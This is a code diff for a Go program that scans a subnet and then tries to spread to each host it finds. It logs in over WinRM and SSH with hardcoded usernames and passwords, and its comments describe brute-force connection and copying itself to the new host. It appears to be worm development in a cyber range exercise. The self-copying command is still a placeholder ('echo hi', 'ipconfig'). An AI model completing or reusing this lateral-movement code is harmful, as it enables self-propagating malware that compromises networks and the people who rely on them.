@@ -1,11 +1,14 @@
-package main 
+package main
 
 import (
 	"fmt"
-	"runtime"
-	"unicode"
+	"io"
 	"net"
+	"runtime"
 	"sync"
+	"unicode"
+
+	"github.com/masterzen/winrm"
 	"golang.org/x/crypto/ssh"
 )
 
@@ -57,8 +60,29 @@ func reverse_lookup_hosts(subnet string) []string {
 }
 
 
-func establish_winRM(host_ip string){
+func establish_winRM(host_ip, username, pswd string) (*winrm.Client, error){
+	endpoint := winrm.NewEndpoint(
+        host_ip,      // host
+        5985,   	 // port (5985 http, 5986 https)
+        false,  	 // https
+        false,  	 // insecure
+        nil,    	 // tlsCert
+        nil,    	 // tlsKey
+        nil,    	 // caCert
+        0,      	 // timeout
+    )
 
+	client, err := winrm.NewClient(endpoint, username, pswd)
+	if err != nil {
+		return nil, err
+	}
+
+	return client, nil
+}
+
+func run_WinRM_cmds(winrm_client *winrm.Client, cmd string) error {
+	_, err := winrm_client.Run(cmd, io.Discard, io.Discard)
+	return err
 }
 
 func establish_SSH(host_ip, username, pswd string) (*ssh.Client, error){
@@ -128,22 +152,28 @@ func spread() {
 			continue
 		}
 
+		// ********************************************
 		// Brute force connect to IPs via SSH or WinRM
-		
-		// WinRM
-		establish_winRM(host_ip)
-		
+		// ********************************************
 
-		// SSH
-		client, err := establish_SSH(host_ip, "cyberrange", "Cyberrange123!")
+		// WinRM
+		winrm_client, err := establish_winRM(host_ip, "sjohnson", "UwU?OwO!67")
 		if err != nil {
-			fmt.Println("Failed to SSH to: " + host_ip) // debugging
-			return
+			fmt.Println("Failed to WinRM to: " + host_ip)
 		}
-		defer client.Close()
 
 		// Command to copy itself to new host
-		run_SSH_cmds(client, "echo hi")
+		run_WinRM_cmds(winrm_client, "ipconfig")
+
+		// SSH
+		ssh_client, err := establish_SSH(host_ip, "cyberrange", "Cyberrange123!")
+		if err != nil {
+			fmt.Println("Failed to SSH to: " + host_ip) // debugging
+		}
+		defer ssh_client.Close()
+
+		// Command to copy itself to new host
+		run_SSH_cmds(ssh_client, "echo hi")
 
 	} 
 
